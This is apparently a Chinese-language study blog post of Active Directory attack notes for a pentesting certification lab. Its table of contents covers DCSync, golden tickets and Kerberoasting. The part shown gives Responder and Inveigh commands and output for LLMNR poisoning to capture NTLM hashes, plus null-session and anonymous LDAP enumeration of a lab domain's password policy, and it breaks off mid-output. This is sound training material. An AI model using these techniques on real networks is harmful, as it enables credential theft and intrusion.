href="#Linux%E4%B8%8B%E5%9F%9F%E4%BF%A1%E4%BB%BB%E6%94%BB%E5%87%BB"><span class="toc-number">8.5.</span> <span class="toc-text">Linux下域信任攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-secretsdump-py-%E6%89%A7%E8%A1%8C-DCSync"><span class="toc-number">8.5.1.</span> <span class="toc-text">使用 secretsdump.py 执行 DCSync</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-lookupsid-py-%E8%BF%9B%E8%A1%8C-SID-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">8.5.2.</span> <span class="toc-text">使用 lookupsid.py 进行 SID 暴力破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%9F%9F%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86%E7%AC%A6-Domain-SID"><span class="toc-number">8.5.3.</span> <span class="toc-text">查找域安全标识符 (Domain SID)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86%E7%AC%A6%EF%BC%88SID%EF%BC%89%E5%B9%B6%E9%99%84%E5%8A%A0%E5%88%B0%E4%BC%81%E4%B8%9A%E7%AE%A1%E7%90%86%E5%91%98-RID"><span class="toc-number">8.5.4.</span> <span class="toc-text">获取域安全标识符（SID）并附加到企业管理员 RID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-ticketer-py-%E6%9E%84%E5%BB%BA%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">8.5.5.</span> <span class="toc-text">使用 ticketer.py 构建黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE-KRB5CCNAME-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-1"><span class="toc-number">8.5.6.</span> <span class="toc-text">设置 KRB5CCNAME 环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Impacket-%E7%9A%84-psexec-py-%E8%8E%B7%E5%8F%96-SYSTEM-shell"><span class="toc-number">8.5.7.</span> <span class="toc-text">使用 Impacket 的 psexec.py 获取 SYSTEM shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-raiseChild-py-%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">8.5.8.</span> <span class="toc-text">使用 raiseChild.py 执行攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%93%E7%A0%B4%E7%95%8C%E9%99%90-%E8%B7%A8%E6%9E%97%E6%94%BB%E5%87%BB"><span class="toc-number">9.</span> <span class="toc-text">打破界限 - 跨林攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E6%9E%97-Kerberoasting"><span class="toc-number">9.1.</span> <span class="toc-text">跨林 Kerberoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainUser-%E6%9E%9A%E4%B8%BE%E5%85%B3%E8%81%94-SPN-%E7%9A%84%E8%B4%A6%E6%88%B7"><span class="toc-number">9.1.1.</span> <span class="toc-text">使用 Get-DomainUser 枚举关联 SPN 的账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE-mssqlsvc-%E8%B4%A6%E6%88%B7"><span class="toc-number">9.1.2.</span> <span class="toc-text">枚举 mssqlsvc 账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Rubeus-%E8%BF%9B%E8%A1%8C-Kerberoasting-%E6%94%BB%E5%87%BB%E5%B9%B6%E4%BD%BF%E7%94%A8-domain-%E6%A0%87%E5%BF%97"><span class="toc-number">9.1.3.</span> <span class="toc-text">使用 Rubeus 进行 Kerberoasting 攻击并使用 &#x2F;domain 标志</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E9%87%8D%E7%94%A8%E4%B8%8E%E7%BB%84%E6%9D%83%E9%99%90"><span class="toc-number">9.2.</span> <span class="toc-text">管理员密码重用与组权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainForeignGroupMember"><span class="toc-number">9.2.1.</span> <span class="toc-text">使用 Get-DomainForeignGroupMember</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Enter-PSSession-%E8%AE%BF%E9%97%AE-DC03"><span class="toc-number">9.2.2.</span> <span class="toc-text">使用 Enter-PSSession 访问 DC03</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SID-%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%BB%A5%E7%94%A8-%E8%B7%A8%E6%9E%97"><span class="toc-number">9.3.</span> <span class="toc-text">SID 历史记录滥用 - 跨林</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E6%9E%97-Kerberoasting-Linux"><span class="toc-number">9.4.</span> <span class="toc-text">跨林 Kerberoasting(Linux)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-GetUserSPNs-py"><span class="toc-number">9.4.1.</span> <span class="toc-text">使用 GetUserSPNs.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-request-%E6%A0%87%E5%BF%97"><span class="toc-number">9.4.2.</span> <span class="toc-text">使用 -request 标志</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Bloodhound-python-%E8%BF%BD%E8%B8%AA%E5%A4%96%E9%83%A8%E7%BB%84%E6%88%90%E5%91%98%E8%BA%AB%E4%BB%BD"><span class="toc-number">9.5.</span> <span class="toc-text">使用 Bloodhound-python 追踪外部组成员身份</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-INLANEFREIGHT-LOCAL-%E8%BF%90%E8%A1%8C-bloodhound-python"><span class="toc-number">9.5.1.</span> <span class="toc-text">针对 INLANEFREIGHT.LOCAL 运行 bloodhound-python</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E6%80%9D%E8%80%83"><span class="toc-number">10.</span> <span class="toc-text">总结思考</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        AD Notes
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">c2tsh4rk</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-03-04T09:34:30.000Z" class="dt-published" itemprop="datePublished">2025-03-04</time>
        
        (Updated: <time datetime="2025-03-13T03:56:07.413Z" class="dt-updated" itemprop="dateModified">2025-03-13</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/CPTS/">CPTS</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CAPE/" rel="tag">CAPE</a>, <a class="p-category" href="/tags/CPTS/" rel="tag">CPTS</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="从初始侦查到获取立足点"><a href="#从初始侦查到获取立足点" class="headerlink" title="从初始侦查到获取立足点"></a>从初始侦查到获取立足点</h1><h2 id="1-osint获取到任何有价值的用户信息"><a href="#1-osint获取到任何有价值的用户信息" class="headerlink" title="1. osint获取到任何有价值的用户信息"></a>1. osint获取到任何有价值的用户信息</h2><h2 id="2-本地账户侦查"><a href="#2-本地账户侦查" class="headerlink" title="2. 本地账户侦查"></a>2. 本地账户侦查</h2><h3 id="LLMNR-NBT-NS-Poisoning"><a href="#LLMNR-NBT-NS-Poisoning" class="headerlink" title="LLMNR&#x2F;NBT-NS Poisoning"></a>LLMNR&#x2F;NBT-NS Poisoning</h3><p><strong>responder获取ntlmhash</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">C47Sh4rk@htb[/htb]$ responder -h</span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|</span><br><span class="line"></span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0</span><br><span class="line"></span><br><span class="line">  Author: Laurent Gaffie (laurent.gaffie@gmail.com)</span><br><span class="line">  To <span class="built_in">kill</span> this script hit CTRL-C</span><br><span class="line"></span><br><span class="line">Usage: responder -I eth0 -w -r -f</span><br><span class="line">or:</span><br><span class="line">responder -I eth0 -wrf</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             show program<span class="string">&#x27;s version number and exit</span></span><br><span class="line"><span class="string">  -h, --help            show this help message and exit</span></span><br><span class="line"><span class="string">  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,</span></span><br><span class="line"><span class="string">                        BROWSER, LLMNR requests without responding.</span></span><br><span class="line"><span class="string">  -I eth0, --interface=eth0</span></span><br><span class="line"><span class="string">                        Network interface to use, you can use &#x27;</span>ALL<span class="string">&#x27; as a</span></span><br><span class="line"><span class="string">                        wildcard for all interfaces</span></span><br><span class="line"><span class="string">  -i 10.0.0.21, --ip=10.0.0.21</span></span><br><span class="line"><span class="string">                        Local IP to use (only for OSX)</span></span><br><span class="line"><span class="string">  -e 10.0.0.22, --externalip=10.0.0.22</span></span><br><span class="line"><span class="string">                        Poison all requests with another IP address than</span></span><br><span class="line"><span class="string">                        Responder&#x27;</span>s one.</span><br><span class="line">  -b, --basic           Return a Basic HTTP authentication. Default: NTLM</span><br><span class="line">  -r, --wredir          Enable answers <span class="keyword">for</span> netbios wredir suffix queries.</span><br><span class="line">                        Answering to wredir will likely <span class="built_in">break</span> stuff on the</span><br><span class="line">                        network. Default: False</span><br><span class="line">  -d, --NBTNSdomain     Enable answers <span class="keyword">for</span> netbios domain suffix queries.</span><br><span class="line">                        Answering to domain suffixes will likely <span class="built_in">break</span> stuff</span><br><span class="line">                        on the network. Default: False</span><br><span class="line">  -f, --fingerprint     This option allows you to fingerprint a host that</span><br><span class="line">                        issued an NBT-NS or LLMNR query.</span><br><span class="line">  -w, --wpad            Start the WPAD rogue proxy server. Default value is</span><br><span class="line">                        False</span><br><span class="line">  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY</span><br><span class="line">                        Upstream HTTP proxy used by the rogue WPAD Proxy <span class="keyword">for</span></span><br><span class="line">                        outgoing requests (format: host:port)</span><br><span class="line">  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file</span><br><span class="line">                        retrieval. This may cause a login prompt. Default:</span><br><span class="line">                        False</span><br><span class="line">  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)</span><br><span class="line">                        authentication <span class="keyword">for</span> the proxy. WPAD doesn<span class="string">&#x27;t need to be</span></span><br><span class="line"><span class="string">                        ON. This option is highly effective when combined with</span></span><br><span class="line"><span class="string">                        -r. Default: False</span></span><br><span class="line"><span class="string">  --lm                  Force LM hashing downgrade for Windows XP/2003 and</span></span><br><span class="line"><span class="string">                        earlier. Default: False</span></span><br><span class="line"><span class="string">  -v, --verbose         Increase verbosity.</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\Inveigh.exe</span><br><span class="line"></span><br><span class="line">[*] Inveigh <span class="number">2.0</span>.<span class="number">4</span> [<span class="type">Started</span> <span class="number">2022</span>-<span class="number">02</span>-<span class="number">28</span><span class="type">T20</span>:<span class="number">03</span>:<span class="number">28</span> | <span class="type">PID</span> <span class="number">6276</span>]</span><br><span class="line">[+] Packet Sniffer Addresses [<span class="type">IP</span> <span class="number">172.16</span><span class="type">.5.25</span> | <span class="type">IPv6</span> <span class="type">fe80</span>::<span class="type">dcec</span>:<span class="number">2831</span>:<span class="number">712</span><span class="type">b</span>:<span class="type">c9a3</span>%<span class="number">8</span>]</span><br><span class="line">[+] Listener Addresses [<span class="type">IP</span> <span class="number">0.0</span><span class="type">.0.0</span> | <span class="type">IPv6</span> ::]</span><br><span class="line">[+] Spoofer Reply Addresses [<span class="type">IP</span> <span class="number">172.16</span><span class="type">.5.25</span> | <span class="type">IPv6</span> <span class="type">fe80</span>::<span class="type">dcec</span>:<span class="number">2831</span>:<span class="number">712</span><span class="type">b</span>:<span class="type">c9a3</span>%<span class="number">8</span>]</span><br><span class="line">[+] Spoofer Options [<span class="type">Repeat</span> <span class="type">Enabled</span> | <span class="type">Local</span> <span class="type">Attacks</span> <span class="type">Disabled</span>]</span><br><span class="line">[ ] DHCPv6</span><br><span class="line">[+] DNS Packet Sniffer [<span class="type">Type</span> <span class="type">A</span>]</span><br><span class="line">[ ] ICMPv6</span><br><span class="line">[+] LLMNR Packet Sniffer [<span class="type">Type</span> <span class="type">A</span>]</span><br><span class="line">[ ] MDNS</span><br><span class="line">[ ] NBNS</span><br><span class="line">[+] HTTP Listener [<span class="type">HTTPAuth</span> <span class="type">NTLM</span> | <span class="type">WPADAuth</span> <span class="type">NTLM</span> | <span class="type">Port</span> <span class="number">80</span>]</span><br><span class="line">[ ] HTTPS</span><br><span class="line">[+] WebDAV [<span class="type">WebDAVAuth</span> <span class="type">NTLM</span>]</span><br><span class="line">[ ] Proxy</span><br><span class="line">[+] LDAP Listener [<span class="type">Port</span> <span class="number">389</span>]</span><br><span class="line">[+] SMB Packet Sniffer [<span class="type">Port</span> <span class="number">445</span>]</span><br><span class="line">[+] File Output [<span class="type">C</span>:\<span class="type">Tools</span>]</span><br><span class="line">[+] Previous Session Files (Not Found)</span><br><span class="line">[*] Press ESC to enter/<span class="keyword">exit</span> interactive console</span><br><span class="line">[!] Failed to <span class="built_in">start</span> HTTP listener on port <span class="number">80</span>, check IP and port usage.</span><br><span class="line">[!] Failed to <span class="built_in">start</span> HTTPv6 listener on port <span class="number">80</span>, check IP and port usage.</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">mDNS</span></span>(QM)(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">mDNS</span></span>(QM)(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">mDNS</span></span>(QM)(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">mDNS</span></span>(QM)(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[+] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">LLMNR</span></span>(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">response</span> <span class="type">sent</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[+] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">LLMNR</span></span>(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">response</span> <span class="type">sent</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">mDNS</span></span>(QM)(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">mDNS</span></span>(QM)(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">mDNS</span></span>(QM)(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">mDNS</span></span>(QM)(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[+] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">LLMNR</span></span>(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">response</span> <span class="type">sent</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[+] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">LLMNR</span></span>(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">response</span> <span class="type">sent</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br></pre></td></tr></table></figure>

<h2 id="3-枚举密码策略"><a href="#3-枚举密码策略" class="headerlink" title="3. 枚举密码策略"></a>3. 枚举密码策略</h2><h3 id="SMB-NULL"><a href="#SMB-NULL" class="headerlink" title="SMB NULL"></a>SMB NULL</h3><p><strong>rpcclient 测试 SMBNULL</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C47Sh4rk@htb[/htb]$ rpcclient -U <span class="string">&quot;&quot;</span> -N 172.16.5.5</span><br><span class="line"></span><br><span class="line">rpcclient $&gt; querydominfo</span><br><span class="line">Domain:		INLANEFREIGHT</span><br><span class="line">Server:		</span><br><span class="line">Comment:	</span><br><span class="line">Total Users:	3650</span><br><span class="line">Total Groups:	0</span><br><span class="line">Total Aliases:	37</span><br><span class="line">Sequence No:	1</span><br><span class="line">Force Logoff:	-1</span><br><span class="line">Domain Server State:	0x1</span><br><span class="line">Server Role:	ROLE_DOMAIN_PDC</span><br><span class="line">Unknown 3:	0x1</span><br></pre></td></tr></table></figure>

<p><strong>使用 enum4linux</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">C47Sh4rk@htb[/htb]$ enum4linux -P 172.16.5.5</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line"> ================================================== </span><br><span class="line">|    Password Policy Information <span class="keyword">for</span> 172.16.5.5    |</span><br><span class="line"> ================================================== </span><br><span class="line"></span><br><span class="line">[+] Attaching to 172.16.5.5 using a NULL share</span><br><span class="line">[+] Trying protocol 139/SMB...</span><br><span class="line"></span><br><span class="line">	[!] Protocol failed: Cannot request session (Called Name:172.16.5.5)</span><br><span class="line"></span><br><span class="line">[+] Trying protocol 445/SMB...</span><br><span class="line">[+] Found domain(s):</span><br><span class="line"></span><br><span class="line">	[+] INLANEFREIGHT</span><br><span class="line">	[+] Builtin</span><br><span class="line"></span><br><span class="line">[+] Password Info <span class="keyword">for</span> Domain: INLANEFREIGHT</span><br><span class="line"></span><br><span class="line">	[+] Minimum password length: 8</span><br><span class="line">	[+] Password <span class="built_in">history</span> length: 24</span><br><span class="line">	[+] Maximum password age: Not Set</span><br><span class="line">	[+] Password Complexity Flags: 000001</span><br><span class="line"></span><br><span class="line">		[+] Domain Refuse Password Change: 0</span><br><span class="line">		[+] Domain Password Store Cleartext: 0</span><br><span class="line">		[+] Domain Password Lockout Admins: 0</span><br><span class="line">		[+] Domain Password No Clear Change: 0</span><br><span class="line">		[+] Domain Password No Anon Change: 0</span><br><span class="line">		[+] Domain Password Complex: 1</span><br><span class="line"></span><br><span class="line">	[+] Minimum password age: 1 day 4 minutes </span><br><span class="line">	[+] Reset Account Lockout Counter: 30 minutes </span><br><span class="line">	[+] Locked Account Duration: 30 minutes </span><br><span class="line">	[+] Account Lockout Threshold: 5</span><br><span class="line">	[+] Forced Log off Time: Not Set</span><br><span class="line"></span><br><span class="line">[+] Retieved partial password policy with rpcclient:</span><br><span class="line"></span><br><span class="line">Password Complexity: Enabled</span><br><span class="line">Minimum Password Length: 8</span><br><span class="line"></span><br><span class="line">enum4linux complete on Tue Feb 22 17:39:29 2022</span><br></pre></td></tr></table></figure>

<p><strong>windows 下使用net测试</strong></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">htb</span>&gt; <span class="title">net</span> <span class="title">use</span> \\<span class="title">DC01</span>\<span class="title">ipc</span>$ &quot;&quot; /<span class="title">u</span>:&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure>

<h3 id="LDAP-Anomynous"><a href="#LDAP-Anomynous" class="headerlink" title="LDAP Anomynous"></a>LDAP Anomynous</h3><p><strong>ldapsearch</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C47Sh4rk@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b <span class="string">&quot;DC=INLANEFREIGHT,DC=LOCAL&quot;</span> -s sub <span class="string">&quot;*&quot;</span> | grep -m 1 -B 10 pwdHistoryLength</span><br><span class="line"></span><br><span class="line">forceLogoff: -9223372036854775808</span><br><span class="line">lockoutDuration: -18000000000</span><br><span class="line">lockOutObservationWindow: -18000000000</span><br><span class="line">lockoutThreshold: 5</span><br><span class="line">maxPwdAge: -9223372036854775808</span><br><span class="line">minPwdAge: -864000000000</span><br><span class="line">minPwdLength: 8</span><br><span class="line">modifiedCountAtLastProm: 0</span><br><span class="line">nextRid: 1002</span><br><span class="line">pwdProperties: 1</span><br><span class="line">pwdHistoryLength: 24</span><br></pre></td></tr></table></figure>

<p><strong>net.exe</strong></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">htb</span>&gt; <span class="title">net</span> <span class="title">accounts</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Force</span> <span class="title">user</span> <span class="title">logoff</span> <span class="title">how</span> <span class="title">long</span> <span class="title">after</span> <span class="title">time</span> <span class="title">expires</span>?:       <span class="title">Never</span></span></span><br><span class="line"><span class="function"><span class="title">Minimum</span> <span class="title">password</span> <span class="title">age</span> (<span class="title">days</span>):                          1</span></span><br><span class="line"><span class="function"><span class="title">Maximum</span> <span 